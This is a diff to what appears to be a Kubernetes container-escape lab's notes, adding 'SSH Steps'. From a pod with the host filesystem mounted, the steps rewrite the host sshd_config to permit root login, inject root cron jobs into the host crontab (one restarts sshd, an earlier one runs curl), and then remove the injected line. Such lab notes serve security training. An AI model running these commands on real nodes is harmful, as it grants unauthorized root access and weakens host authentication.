@@ -20,6 +20,25 @@ echo "* * * * * root curl ifconfig.co > /root/data 2>&1" >> /root/ibm/etc/cronta
 vim /root/ibm/etc/crontab
 cat /root/ibm/root/data
 ```
+---
+
+SSH Steps
+```bash
+sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /root/ibm/etc/ssh/sshd_config
+
+cat /root/ibm/etc/ssh/sshd_config | grep PermitRootLogin
+```
+
+restart SSH Daemon
+```bash
+echo "* * * * * root killall -1 sshd && echo "Killed SSH Daemon" > /root/data 2>&1" >> /root/ibm/etc/crontab
+```
+
+delete last line from file
+```bash
+sed -i '$ d' /root/ibm/etc/crontab
+```
+
 ```bash
 kubectl delete po ubuntu
 ```
